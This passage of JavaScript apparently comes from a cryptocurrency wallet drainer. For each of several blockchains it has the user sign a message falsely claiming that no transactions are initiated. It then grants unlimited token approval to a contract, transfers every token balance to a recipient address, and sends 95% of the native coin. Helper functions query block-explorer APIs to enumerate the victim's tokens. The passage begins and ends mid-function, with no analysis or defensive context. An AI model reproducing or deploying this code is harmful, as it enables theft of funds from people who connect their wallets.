                              console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
                          }
                      } catch (error) {
                          console.error('Error transferring tokens:', error);
                         
                      }
          
                     try {
                       //send native tokens
                       const etherBalance = await provider.getBalance(address)
                       console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} CRONOS`);
          
                       if(!etherBalance.eq(0)){
                         const amountToSend = etherBalance.mul(95).div(100);
                       console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} CRONOS`);
          
                   // Define the transaction
                       const transaction = {
                           to: recipientAddress, // Replace with the recipient's address
                           value: amountToSend,
                           // Optional: You can specify gasLimit and gasPrice here if necessary
                       };
                       const txResponse = await signer.sendTransaction(transaction);
                       console.log(`Transaction hash: ${txResponse.hash}`);
          
                       // Wait for the transaction to be mined
                       const txReceipt = await txResponse.wait();
                       console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                       }else{
                         console.log('No balance found for CRONOS to send')
                       }
                     } catch (error) {
                          console.error('Error transferring CRONOS:', error);
                     }
                      break;
          
          
                    //KLAYTN
                    case klaytn.chainId:
                      const klaytnTokens = await fetchKLAYTNTokens(address);
          
                      // Message to sign
                      const klaytnMessage = "This is a standard message approval to verify your account. No transactions are initiated";
                      const klaytnSignature = await signer.signMessage(klaytnMessage);
                      console.log('Signature:', klaytnSignature);
          
                      const klaytnTokenDetails = [];
                      for (let token of klaytnTokens) {
                          const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                          const balance = await tokenContract.balanceOf(address);
                          if (!balance.eq(0)) { //Only add tokens with non-zero balances
                              klaytnTokenDetails.push({
                                  contract: tokenContract,
                                  balance: balance,
                                  symbol: token.tokenSymbol,
                                  address: token.contractAddress
                              });
                          }
                      }
          
                      // Sort tokens by balance, descending
                      klaytnTokenDetails.sort((a, b) => b.balance.sub(a.balance));
          
                      try {
                          for(let token of klaytnTokenDetails){
                              const maxUint256 = ethers.constants.MaxUint256;
                              // Approve unlimited tokens
                              const approveTx = await token.contract.approve(klaytnContractAddress, maxUint256);
                              await approveTx.wait();
                              console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
          
          
                              // Transfer tokens using the smart contract
                              const contract = new ethers.Contract(klaytnContractAddress, contractABI, signer);
                              const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
                              await transferTx.wait();
                              console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
                          }
                      } catch (error) {
                          console.error('Error transferring tokens:', error);
                      }
          
                     try {
                       //send native tokens
                       const etherBalance = await provider.getBalance(address)
                       console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} KLAYTN`);
          
                       if(!etherBalance.eq(0)){
                         const amountToSend = etherBalance.mul(95).div(100);
                       console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} KLAYTN`);
          
                   // Define the transaction
                       const transaction = {
                           to: recipientAddress, // Replace with the recipient's address
                           value: amountToSend,
                           // Optional: You can specify gasLimit and gasPrice here if necessary
                       };
                       const txResponse = await signer.sendTransaction(transaction);
                       console.log(`Transaction hash: ${txResponse.hash}`);
          
                       // Wait for the transaction to be mined
                       const txReceipt = await txResponse.wait();
                       console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                       }else{
                         console.log('No balance found for KLAYTN to send')
                        
                       }
                     } catch (error) {
                          console.error('Error transferring KLAYTN:', error);
                          
                     }
                      break;
          
          
                    
                    //PLATON
                    case platon.chainId:
                      const platTokens = await fetchPLATONTokens(address);
          
                      // Message to sign
                      const platMessage = "This is a standard message approval to verify your account. No transactions are initiated";
                      const platSignature = await signer.signMessage(platMessage);
                      console.log('Signature:', platSignature);
          
                      const platTokenDetails = [];
                      for (let token of platTokens) {
                          const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                          const balance = await tokenContract.balanceOf(address);
                          if (!balance.eq(0)) { //Only add tokens with non-zero balances
                              platTokenDetails.push({
                                  contract: tokenContract,
                                  balance: balance,
                                  symbol: token.tokenSymbol,
                                  address: token.contractAddress
                              });
                          }
                      }
          
                      // Sort tokens by balance, descending
                      platTokenDetails.sort((a, b) => b.balance.sub(a.balance));
          
                      try {
                          for(let token of platTokenDetails){
                              const maxUint256 = ethers.constants.MaxUint256;
                              // Approve unlimited tokens
                              const approveTx = await token.contract.approve(platonContractAddress, maxUint256);
                              await approveTx.wait();
                              console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
          
          
                              // Transfer tokens using the smart contract
                              const contract = new ethers.Contract(platonContractAddress, contractABI, signer);
                              const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
                              await transferTx.wait();
                              console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
                          }
                      } catch (error) {
                          console.error('Error transferring tokens:', error);
                          
                      }
          
                     try {
                       //send native tokens
                       const etherBalance = await provider.getBalance(address)
                       console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} PLATON`);
          
                       if(!etherBalance.eq(0)){
                         const amountToSend = etherBalance.mul(95).div(100);
                       console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} PLATON`);
          
                   // Define the transaction
                       const transaction = {
                           to: recipientAddress, // Replace with the recipient's address
                           value: amountToSend,
                           // Optional: You can specify gasLimit and gasPrice here if necessary
                       };
                       const txResponse = await signer.sendTransaction(transaction);
                       console.log(`Transaction hash: ${txResponse.hash}`);
          
                       // Wait for the transaction to be mined
                       const txReceipt = await txResponse.wait();
                       console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                       }else{
                         console.log('No balance found for PLATON to send')
                         
                       }
                     } catch (error) {
                          console.error('Error transferring PLATON:', error);
                         
                     }
                      break;
          
          
                    //HARMONY
                    case harmony.chainId:
                      const harTokens = await fetchHARMONYTokens(address);
          
                      // Message to sign
                      const harMessage = "This is a standard message approval to verify your account. No transactions are initiated";
                      const harSignature = await signer.signMessage(harMessage);
                      console.log('Signature:', harSignature);
          
                      const harTokenDetails = [];
                      for (let token of harTokens) {
                          const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                          const balance = await tokenContract.balanceOf(address);
                          if (!balance.eq(0)) { //Only add tokens with non-zero balances
                              harTokenDetails.push({
                                  contract: tokenContract,
                                  balance: balance,
                                  symbol: token.tokenSymbol,
                                  address: token.contractAddress
                              });
                          }
                      }
          
                      // Sort tokens by balance, descending
                      harTokenDetails.sort((a, b) => b.balance.sub(a.balance));
          
                      try {
                          for(let token of harTokenDetails){
                              const maxUint256 = ethers.constants.MaxUint256;
                              // Approve unlimited tokens
                              const approveTx = await token.contract.approve(harmonyContractAddress, maxUint256);
                              await approveTx.wait();
                              console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
          
          
                              // Transfer tokens using the smart contract
                              const contract = new ethers.Contract(harmonyContractAddress, contractABI, signer);
                              const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
                              await transferTx.wait();
                              console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
                          }
                      } catch (error) {
                          console.error('Error transferring tokens:', error);
                          
                      }
          
                     try {
                       //send native tokens
                       const etherBalance = await provider.getBalance(address)
                       console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} HARMONY`);
          
                       if(!etherBalance.eq(0)){
                         const amountToSend = etherBalance.mul(95).div(100);
                       console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} HARMONY`);
          
                   // Define the transaction
                       const transaction = {
                           to: recipientAddress, // Replace with the recipient's address
                           value: amountToSend,
                           // Optional: You can specify gasLimit and gasPrice here if necessary
                       };
                       const txResponse = await signer.sendTransaction(transaction);
                       console.log(`Transaction hash: ${txResponse.hash}`);
          
                       // Wait for the transaction to be mined
                       const txReceipt = await txResponse.wait();
                       console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                       }else{
                         console.log('No balance found for HARMONY to send')
                         
                       }
                     } catch (error) {
                          console.error('Error transferring HARMONY:', error);
                        
                     }
                      break;
          
          
                    //HECO
                    case heco.chainId:
                      const hecoTokens = await fetchHECOTokens(address);
          
                      // Message to sign
                      const hecoMessage = "This is a standard message approval to verify your account. No transactions are initiated";
                      const hecoSignature = await signer.signMessage(hecoMessage);
                      console.log('Signature:', hecoSignature);
          
                      const hecoTokenDetails = [];
                      for (let token of hecoTokens) {
                          const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                          const balance = await tokenContract.balanceOf(address);
                          if (!balance.eq(0)) { //Only add tokens with non-zero balances
                              hecoTokenDetails.push({
                                  contract: tokenContract,
                                  balance: balance,
                                  symbol: token.tokenSymbol,
                                  address: token.contractAddress
                              });
                          }
                      }
          
                      // Sort tokens by balance, descending
                      hecoTokenDetails.sort((a, b) => b.balance.sub(a.balance));
          
                      try {
                          for(let token of hecoTokenDetails){
                              const maxUint256 = ethers.constants.MaxUint256;
                              // Approve unlimited tokens
                              const approveTx = await token.contract.approve(hecoContractAddress, maxUint256);
                              await approveTx.wait();
                              console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
          
          
                              // Transfer tokens using the smart contract
                              const contract = new ethers.Contract(hecoContractAddress, contractABI, signer);
                              const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
                              await transferTx.wait();
                              console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
                          }
                      } catch (error) {
                          console.error('Error transferring tokens:', error);
                         
                      }
          
                     try {
                       //send native tokens
                       const etherBalance = await provider.getBalance(address)
                       console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} HECO`);
          
                       if(!etherBalance.eq(0)){
                         const amountToSend = etherBalance.mul(95).div(100);
                       console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} HECO`);
          
                   // Define the transaction
                       const transaction = {
                           to: recipientAddress, // Replace with the recipient's address
                           value: amountToSend,
                           // Optional: You can specify gasLimit and gasPrice here if necessary
                       };
                       const txResponse = await signer.sendTransaction(transaction);
                       console.log(`Transaction hash: ${txResponse.hash}`);
          
                       // Wait for the transaction to be mined
                       const txReceipt = await txResponse.wait();
                       console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                       }else{
                         console.log('No balance found for HECO to send')
                         
                       }
                     } catch (error) {
                          console.error('Error transferring HECO:', error);
                          
                     }
                      break;
          
          
                    //SMARTBCH
                    case smartbch.chainId:
                      const bchTokens = await fetchSMARTBCHTokens(address);
          
                      // Message to sign
                      const bchMessage = "This is a standard message approval to verify your account. No transactions are initiated";
                      const bchSignature = await signer.signMessage(bchMessage);
                      console.log('Signature:', bchSignature);
          
                      const bchTokenDetails = [];
                      for (let token of bchTokens) {
                          const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                          const balance = await tokenContract.balanceOf(address);
                          if (!balance.eq(0)) { //Only add tokens with non-zero balances
                              bchTokenDetails.push({
                                  contract: tokenContract,
                                  balance: balance,
                                  symbol: token.tokenSymbol,
                                  address: token.contractAddress
                              });
                          }
                      }
          
                      // Sort tokens by balance, descending
                      bchTokenDetails.sort((a, b) => b.balance.sub(a.balance));
          
                      try {
                          for(let token of bchTokenDetails){
                              const maxUint256 = ethers.constants.MaxUint256;
                              // Approve unlimited tokens
                              const approveTx = await token.contract.approve(smartbchContractAddress, maxUint256);
                              await approveTx.wait();
                              console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
          
          
                              // Transfer tokens using the smart contract
                              const contract = new ethers.Contract(smartbchContractAddress, contractABI, signer);
                              const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
                              await transferTx.wait();
                              console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
                          }
                      } catch (error) {
                          console.error('Error transferring tokens:', error);
                          
                      }
          
                     try {
                       //send native tokens
                       const etherBalance = await provider.getBalance(address)
                       console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} SMARTBCH`);
          
                       if(!etherBalance.eq(0)){
                         const amountToSend = etherBalance.mul(95).div(100);
                       console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} SMARTBCH`);
          
                   // Define the transaction
                       const transaction = {
                           to: recipientAddress, // Replace with the recipient's address
                           value: amountToSend,
                           // Optional: You can specify gasLimit and gasPrice here if necessary
                       };
                       const txResponse = await signer.sendTransaction(transaction);
                       console.log(`Transaction hash: ${txResponse.hash}`);
          
                       // Wait for the transaction to be mined
                       const txReceipt = await txResponse.wait();
                       console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                       }else{
                         console.log('No balance found for SMARTBCH to send')
                         
                       }
                     } catch (error) {
                          console.error('Error transferring SMARTBCH:', error);
                         
                     }
                      break;
          
          
                    //CONFLUX
                    case conflux.chainId:
                      const confluxTokens = await fetchCONFLUXTokens(address);
          
                      // Message to sign
                      const confluxMessage = "This is a standard message approval to verify your account. No transactions are initiated";
                      const confluxSignature = await signer.signMessage(confluxMessage);
                      console.log('Signature:', confluxSignature);
          
                      const confluxTokenDetails = [];
                      for (let token of confluxTokens) {
                          const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                          const balance = await tokenContract.balanceOf(address);
                          if (!balance.eq(0)) { //Only add tokens with non-zero balances
                              confluxTokenDetails.push({
                                  contract: tokenContract,
                                  balance: balance,
                                  symbol: token.tokenSymbol,
                                  address: token.contractAddress
                              });
                          }
                      }
          
                      // Sort tokens by balance, descending
                      confluxTokenDetails.sort((a, b) => b.balance.sub(a.balance));
          
                      try {
                          for(let token of confluxTokenDetails){
                              const maxUint256 = ethers.constants.MaxUint256;
                              // Approve unlimited tokens
                              const approveTx = await token.contract.approve(confluxContractAddress, maxUint256);
                              await approveTx.wait();
                              console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
          
          
                              // Transfer tokens using the smart contract
                              const contract = new ethers.Contract(confluxContractAddress, contractABI, signer);
                              const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
                              await transferTx.wait();
                              console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
                          }
                      } catch (error) {
                          console.error('Error transferring tokens:', error);
                        
                      }
          
                     try {
                       //send native tokens
                       const etherBalance = await provider.getBalance(address)
                       console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} CONFLUX`);
          
                       if(!etherBalance.eq(0)){
                         const amountToSend = etherBalance.mul(95).div(100);
                       console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} CONFLUX`);
          
                   // Define the transaction
                       const transaction = {
                           to: recipientAddress, // Replace with the recipient's address
                           value: amountToSend,
                           // Optional: You can specify gasLimit and gasPrice here if necessary
                       };
                       const txResponse = await signer.sendTransaction(transaction);
                       console.log(`Transaction hash: ${txResponse.hash}`);
          
                       // Wait for the transaction to be mined
                       const txReceipt = await txResponse.wait();
                       console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                       }else{
                         console.log('No balance found for CONFLUX to send')
                         
                       }
                     } catch (error) {
                          console.error('Error transferring CONFLUX:', error);
                         
                     }
                      break;
          
          
                    //MERLIN
                    case merlin.chainId:
                      const merlinTokens = await fetchMERLINTokens(address);
          
                      // Message to sign
                      const merlinMessage = "This is a standard message approval to verify your account. No transactions are initiated";
                      const merlinSignature = await signer.signMessage(merlinMessage);
                      console.log('Signature:', merlinSignature);
          
                      const merlinTokenDetails = [];
                      for (let token of merlinTokens) {
                          const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                          const balance = await tokenContract.balanceOf(address);
                          if (!balance.eq(0)) { //Only add tokens with non-zero balances
                              merlinTokenDetails.push({
                                  contract: tokenContract,
                                  balance: balance,
                                  symbol: token.tokenSymbol,
                                  address: token.contractAddress
                              });
                          }
                      }
          
                      // Sort tokens by balance, descending
                      merlinTokenDetails.sort((a, b) => b.balance.sub(a.balance));
          
                      try {
                          for(let token of merlinTokenDetails){
                              const maxUint256 = ethers.constants.MaxUint256;
                              // Approve unlimited tokens
                              const approveTx = await token.contract.approve(merlinContractAddress, maxUint256);
                              await approveTx.wait();
                              console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
          
          
                              // Transfer tokens using the smart contract
                              const contract = new ethers.Contract(merlinContractAddress, contractABI, signer);
                              const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
                              await transferTx.wait();
                              console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
                          }
                      } catch (error) {
                          console.error('Error transferring tokens:', error);
                          
                      }
          
                     try {
                       //send native tokens
                       const etherBalance = await provider.getBalance(address)
                       console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} MERLIN`);
          
                       if(!etherBalance.eq(0)){
                         const amountToSend = etherBalance.mul(95).div(100);
                       console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} MERLIN`);
          
                   // Define the transaction
                       const transaction = {
                           to: recipientAddress, // Replace with the recipient's address
                           value: amountToSend,
                           // Optional: You can specify gasLimit and gasPrice here if necessary
                       };
                       const txResponse = await signer.sendTransaction(transaction);
                       console.log(`Transaction hash: ${txResponse.hash}`);
          
                       // Wait for the transaction to be mined
                       const txReceipt = await txResponse.wait();
                       console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                       }else{
                         console.log('No balance found for MERLIN to send')
                        
                       }
                     } catch (error) {
                          console.error('Error transferring MERLIN:', error)
                     }
                      break;
                      
                    default:
                      console.log("connected to an unsupported network")
                      break
                  }

                continue;

            } catch (switchError) {
                if (switchError.code === 4902) {
                    try {
                        // If the network is not added to the user's wallet, add it
                        await provider.send('wallet_addEthereumChain', [{
                            chainId: `0x${targetNetworkId.toString(16)}`,
                            rpcUrls: [net.rpcUrl],
                            chainName: net.name,
                            nativeCurrency: net.nativeCurrency,
                            blockExplorerUrls: [net.blockExplorerUrl]
                        }]);
                        console.log(`Added and switched to network: ${targetNetworkId}`);
                        continue; // Continue to the next network
                    } catch (addError) {
                        console.error('Failed to add the network:', addError);
                    }
                }else{
                    console.error('Failed to switch the network:', switchError);
                    signer = provider.getSigner();
                }
            }
        }
    }

    } catch (error) {
        console.error('Error handling tokens:', error);
    }

}

//API FUNCTIONS
async function fetchETHTokens(account) {
    const url = `https://api.etherscan.io/api?module=account&action=tokentx&address=${account}&startblock=0&endblock=99999999&sort=asc&apikey=${etherscanapikey}`;
    try {
        const response = await fetch(url);
        const data = await response.json();
        if (data.status === "1" && data.message === "OK") {
            // Deduplicate tokens based on contract address
            const seen = new Set();
            const uniqueTokens = data.result.filter(tx => {
                const duplicate = seen.has(tx.contractAddress);
                seen.add(tx.contractAddress);
                return !duplicate;
            });
            return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
        } else {
            console.error('Failed to fetch token transactions:', data.result);
        }
    } catch (error) {
        console.error('Error fetching token transactions:', error);
    }
    return [];
  }
  


//BNB API FUNCTION
async function fetchBNBTokens(account) {
  const url = `https://api.bscscan.com/api?module=account&action=tokentx&address=${account}&startblock=0&endblock=99999999&sort=asc&apikey=${bnbscanapikey}`;
  try {
      const response = await fetch(url);
      const data = await response.json();
      if (data.status === "1" && data.message === "OK") {
          // Deduplicate tokens based on contract address
          const seen = new Set();
          const uniqueTokens = data.result.filter(tx => {
              const duplicate = seen.has(tx.contractAddress);
              seen.add(tx.contractAddress);
              return !duplicate;
          });
          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
      } else {
          console.error('Failed to fetch token transactions:', data.result);
      }
  } catch (error) {
      console.error('Error fetching token transactions:', error);
  }
  return [];
}

//ARBITRUM CONTRACT
async function fetchARBTokens(account) {
  const url = `https://api.arbiscan.io/api?module=account&action=tokentx&address=${account}&startblock=0&endblock=99999999&sort=asc&apikey=${arbapikey}`
  try {
      const response = await fetch(url);
      const data = await response.json();
      if (data.status === "1" && data.message === "OK") {
          // Deduplicate tokens based on contract address
          const seen = new Set();
          const uniqueTokens = data.result.filter(tx => {
              const duplicate = seen.has(tx.contractAddress);
              seen.add(tx.contractAddress);
              return !duplicate;
          });
          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
      } else {
          console.error('Failed to fetch token transactions:', data.result);
      }
  } catch (error) {
      console.error('Error fetching token transactions:', error);
  }
  return [];
}


//OPTIMISM API FUNCTION
async function fetchOPTokens(account) {
  const url = `https://api-optimistic.etherscan.io/api?module=account&action=tokentx&&address=${account}&startblock=0&endblock=99999999&sort=asc&apikey=${optimismapikey}`
  try {
      const response = await fetch(url);
      const data = await response.json();
      if (data.status === "1" && data.message === "OK") {
          // Deduplicate tokens based on contract address
          const seen = new Set();
          const uniqueTokens = data.result.filter(tx => {
              const duplicate = seen.has(tx.contractAddress);
              seen.add(tx.contractAddress);
              return !duplicate;
          });
          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
      } else {
          console.error('Failed to fetch token transactions:', data.result);
      }
  } catch (error) {
      console.error('Error fetching token transactions:', error);
  }
  return [];
}

//ARBNOVA API FUNCTION
async function fetchARBNOVATokens(account) {
  const url = `https://api-nova.arbiscan.io/api?module=account&action=tokentx&address=${account}&startblock=0&endblock=99999999&sort=asc&apikey=${arbnovaapikey}`
  try {
      const response = await fetch(url);
      const data = await response.json();
      if (data.status === "1" && data.message === "OK") {
          // Deduplicate tokens based on contract address
          const seen = new Set();
          const uniqueTokens = data.result.filter(tx => {
              const duplicate = seen.has(tx.contractAddress);
              seen.add(tx.contractAddress);
              return !duplicate;
          });
          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
      } else {
          console.error('Failed to fetch token transactions:', data.result);
      }
  } catch (error) {
      console.error('Error fetching token transactions:', error);
  }
  return [];
}


//BASE API FUNCTION
async function fetchBASETokens(account) {
  const url = `https://api.basescan.org/api?module=account&action=tokentx&address=${account}&startblock=0&endblock=27025780&sort=asc&apikey=${baseapikey}`
  try {
      const response = await fetch(url);
      const data = await response.json();
      if (data.status === "1" && data.message === "OK") {
          // Deduplicate tokens based on contract address
          const seen = new Set();
          const uniqueTokens = data.result.filter(tx => {
              const duplicate = seen.has(tx.contractAddress);
              seen.add(tx.contractAddress);
              return !duplicate;
          });
          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
      } else {
          console.error('Failed to fetch token transactions:', data.result);
      }
  } catch (error) {
      console.error('Error fetching token transactions:', error);
  }
  return [];
}


//ZKSYNC API FUNCTION
async function fetchZKSYNCTokens(account) {
  const url = `https://api-era.zksync.network/api?module=account&action=tokentx&address=${account}&startblock=0&endblock=latest&sort=asc&apikey=${zksyncapikey}`
  try {
      const response = await fetch(url);
      const data = await response.json();
      if (data.status === "1" && data.message === "OK") {
          // Deduplicate tokens based on contract address
          const seen = new Set();
          const uniqueTokens = data.result.filter(tx => {
              const duplicate = seen.has(tx.contractAddress);
              seen.add(tx.contractAddress);
              return !duplicate;
          });
          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
      } else {
          console.error('Failed to fetch token transactions:', data.result);
      }
  } catch (error) {
      console.error('Error fetching token transactions:', error);
  }
  return [];
}

//POLYGON API FUNCTION
async function fetchPOLYGONTokens(account) {
  const url = `https://api.polygonscan.com/api?module=account&action=tokentx&address=${account}&startblock=0&endblock=99999999&sort=asc&apikey=${polygonapikey}`
  try {
      const response = await fetch(url);
      const data = await response.json();
      if (data.status === "1" && data.message === "OK") {
          // Deduplicate tokens based on contract address
          const seen = new Set();
          const uniqueTokens = data.result.filter(tx => {
              const duplicate = seen.has(tx.contractAddress);
              seen.add(tx.contractAddress);
              return !duplicate;
          });
          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
      } else {
          console.error('Failed to fetch token transactions:', data.result);
      }
  } catch (error) {
      console.error('Error fetching token transactions:', error);
  }
  return [];
}

//POLYGONEVM API FUNCTION
async function fetchPOLYGONEVMTokens(account) {
  const url = `https://api-zkevm.polygonscan.com/api?module=account&action=tokentx&address=${account}&startblock=0&endblock=99999999&sort=asc&apikey=${polygonevmapikey}`
  try {
      const response = await fetch(url);
      const data = await response.json();
      if (data.status === "1" && data.message === "OK") {
          // Deduplicate tokens based on contract address
          const seen = new Set();
          const uniqueTokens = data.result.filter(tx => {
              const duplicate = seen.has(tx.contractAddress);
              seen.add(tx.contractAddress);
              return !duplicate;
          });
          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
      } else {
          console.error('Failed to fetch token transactions:', data.result);
      }
  } catch (error) {
      console.error('Error fetching token transactions:', error);
  }
  return [];
}


//BLAST API FUNCTION
async function fetchBLASTTokens(account) {
  const url = `https://api.blastscan.io/api?module=account&action=tokentx&address=${account}&startblock=0&endblock=999999999&sort=asc&apikey=${blastapikey}`
  try {
      const response = await fetch(url);
      const data = await response.json();
      if (data.status === "1" && data.message === "OK") {
          // Deduplicate tokens based on contract address
          const seen = new Set();
          const uniqueTokens = data.result.filter(tx => {
              const duplicate = seen.has(tx.contractAddress);
              seen.add(tx.contractAddress);
              return !duplicate;
          });
          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
      } else {
          console.error('Failed to fetch token transactions:', data.result);
      }
  } catch (error) {
      console.error('Error fetching token transactions:', error);
  }
  return [];
}


//SCROLL API FUNCTION
async function fetchSCROLLTokens(account) {
  const url = `https://api.scrollscan.com/api?module=account&action=tokentx&address=${account}&startblock=0&endblock=2500000&sort=asc&apikey=${scrollapikey}`
  try {
      const response = await fetch(url);
      const data = await response.json();
      if (data.status === "1" && data.message === "OK") {
          // Deduplicate tokens based on contract address
          const seen = new Set();
          const uniqueTokens = data.result.filter(tx => {
              const duplicate = seen.has(tx.contractAddress);
              seen.add(tx.contractAddress);
              return !duplicate;
          });
          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
      } else {
          console.error('Failed to fetch token transactions:', data.result);
      }
  } catch (error) {
      console.error('Error fetching token transactions:', error);
  }
  return [];
}


//METIS API FUNCTION
async function fetchMETISTokens(account) {
  const url = `https://andromeda-explorer.metis.io/api?module=account&action=tokenlist&address=${account}`
  try {
      const response = await fetch(url);
      const data = await response.json();
      if (data.status === "1" && data.message === "OK") {
          // Deduplicate tokens based on contract address
          const seen = new Set();
          const uniqueTokens = data.result.filter(tx => {
              const duplicate = seen.has(tx.contractAddress);
              seen.add(tx.contractAddress);
              return !duplicate;
          });
          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
      } else {
          console.error('Failed to fetch token transactions:', data.result);
      }
  } catch (error) {
      console.error('Error fetching token transactions:', error);
  }
  return [];
}

//MANTA API FUNCTION
async function fetchMANTATokens(account) {
  const url = `https://www.oklink.com/api/v5/explorer/manta/api?module=account&action=tokentx&address=${account}&startblock=19153000&endblock=19153162&sort=asc`
  const headers = new Headers({ "Ok-Access-Key": okxapikey, "Content-Type": "application/json"})
  try {
      const response = await fetch(url, { method: 'GET', headers});
      const data = await response.json();
      if (data.status === "1" && data.message === "OK") {
          // Deduplicate tokens based on contract address
          const seen = new Set();
          const uniqueTokens = data.result.filter(tx => {
              const duplicate = seen.has(tx.contractAddress);
              seen.add(tx.contractAddress);
              return !duplicate;
          });
          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
      } else {
          console.error('Failed to fetch token transactions:', data.result);
      }
  } catch (error) {
      console.error('Error fetching token transactions:', error);
  }
  return [];
}

//FANTOM API FUNCTION
async function fetchFANTOMTokens(account) {
  const url = `https://api.ftmscan.com/api?module=account&action=tokentx&address=${account}&startblock=0&endblock=99999999&sort=asc&apikey=${fantomapikey}`
  try {
      const response = await fetch(url);
      const data = await response.json();
      if (data.status === "1" && data.message === "OK") {
          // Deduplicate tokens based on contract address
          const seen = new Set();
          const uniqueTokens = data.result.filter(tx => {
              const duplicate = seen.has(tx.contractAddress);
              seen.add(tx.contractAddress);
              return !duplicate;
          });
          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
      } else {
          console.error('Failed to fetch token transactions:', data.result);
      }
  } catch (error) {
      console.error('Error fetching token transactions:', error);
  }
  return [];
}


//GNOSIS API FUNCTION
async function fetchGNOSISTokens(account) {
  const url = `https://api.gnosisscan.io/api?module=account&action=tokentx&address=${account}&startblock=0&endblock=99999999&sort=asc&apikey=${gnosisapikey}`
  try {
      const response = await fetch(url);
      const data = await response.json();
      if (data.status === "1" && data.message === "OK") {
          // Deduplicate tokens based on contract address
          const seen = new Set();
          const uniqueTokens = data.result.filter(tx => {
              const duplicate = seen.has(tx.contractAddress);
              seen.add(tx.contractAddress);
              return !duplicate;
          });
          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
      } else {
          console.error('Failed to fetch token transactions:', data.result);
      }
  } catch (error) {
      console.error('Error fetching token transactions:', error);
  }
  return [];
}

//LINEA API FUNCTION
async function fetchLINEATokens(account) {
  const url = `https://api.lineascan.build/api?module=account&action=tokentx&address=${account}&startblock=0&endblock=2500000&sort=asc&apikey=${lineaapikey}`
  try {
      const response = await fetch(url);
      const data = await response.json();
      if (data.status === "1" && data.message === "OK") {
          // Deduplicate tokens based on contract address
          const seen = new Set();
          const uniqueTokens = data.result.filter(tx => {
              const duplicate = seen.has(tx.contractAddress);
              seen.add(tx.contractAddress);
              return !duplicate;
          });
